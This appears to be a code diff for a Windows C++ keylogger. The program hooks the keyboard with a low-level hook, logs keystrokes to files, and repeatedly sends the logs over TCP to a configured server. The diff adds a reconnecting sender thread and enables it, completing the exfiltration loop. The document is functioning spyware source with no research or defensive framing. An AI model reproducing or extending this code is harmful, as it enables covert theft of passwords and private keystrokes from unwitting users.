@@ -13,10 +13,9 @@ using namespace std;
 
 bool shift = false;
 
-SOCKET socket_fd;
-
 string logfile = "f.txt";
-string streamfile = "f2.txt";
+string streamfile = "f.txt";
+
 
 string SERVER_IP = "127.0.0.1";
 const int SERVER_PORT = 1235; 
@@ -42,9 +41,11 @@ string findIp(string hostname) {
     return ip;
 }
 
-void sendfile(SOCKET s, const char fname[]){
+bool sendfile(SOCKET s, const char fname[]){
     HANDLE hFile = CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    TransmitFile(s, hFile, 0, 0, NULL, NULL, 0);
+    bool b = TransmitFile(s, hFile, 0, 0, NULL, NULL, 0);
+    CloseHandle(hFile);
+    return b;
 }
 
 void sendstring(SOCKET s, string k){
@@ -58,9 +59,7 @@ string filesize(const char n[]){
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    cout << "e\n";
     if (nCode == HC_ACTION) {
-        
         
         if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN){
             PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
@@ -81,7 +80,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
             int h = p->vkCode;
             if (h == 160 || h == 161){
-                shift = false;
+                shift = false ;
             }
         }
     }
@@ -89,24 +88,64 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 
-void send(SOCKET sock){
+bool send(SOCKET sock){
     string size = filesize(streamfile.c_str());
     string send = "'keylog\\f.txt'"+size+"b";
     sendstring(sock, send.c_str());
-    sendfile(sock, streamfile.c_str());
-    sendfile(socket_fd, "b.txt");
+    bool b = sendfile(sock, streamfile.c_str());
+    sendfile(sock, "b.txt");
     string s = logfile;
     logfile = streamfile;
     streamfile = s;
+    return b;
 }
 
-void sender(){
-    while (true){
-        send(socket_fd);
-        this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(5));
-    }
 
-   
+int sender(){
+
+
+    bool connected = false;
+
+    while (true){
+
+        WSADATA wsaData;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+            cout << "could not initialize winsock" << endl;
+        }
+
+        sockaddr_in serverAddr{};
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(SERVER_PORT);
+        if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
+            cout << "invalid IP." << endl;
+        }
+
+        SOCKET socket_fd;
+
+        while (!connected){
+            socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+            if (socket_fd == INVALID_SOCKET) {
+                cout << "could not make socket" << endl;
+                shutdown(socket_fd, SD_SEND);
+                closesocket(socket_fd);
+                // WSACleanup();
+                connected = false;
+            }
+
+            connected = true;
+            if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+                cout << "could not connect to server" << endl;
+                shutdown(socket_fd, SD_SEND);
+                closesocket(socket_fd);
+                // WSACleanup();
+                connected = false;
+            }
+            this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(2));
+        }
+        cout << "sent\n";
+        connected = send(socket_fd);
+        this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(5));
+    } 
 }
 
 void runlog(){
@@ -123,46 +162,12 @@ void runlog(){
 }
 
 int main(){
-
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        cout << "could not initialize winsock" << endl;
-        return 1;
-    }
-
-    // Create socket
-    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (socket_fd == INVALID_SOCKET) {
-        cout << "could not make socket" << endl;
-        WSACleanup();
-        return 1;
-    }
-
-    // Set up server address
-    sockaddr_in serverAddr{};
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(SERVER_PORT);
-    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
-        cout << "invalid IP." << endl;
-        closesocket(socket_fd);
-        WSACleanup();
-        return 1;
-    }
-
-    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        cout << "could not connect to server" << endl;
-        closesocket(socket_fd);
-        WSACleanup();
-        return 1;
-    }
     
     thread logger = thread(runlog);
-    // thread tcp = thread(sender);
+    thread tcp = thread(sender);
 
     logger.join();
-    // tcp.join();
+    tcp.join();
 
-    closesocket(socket_fd);
-    WSACleanup();
     return 0;
 }
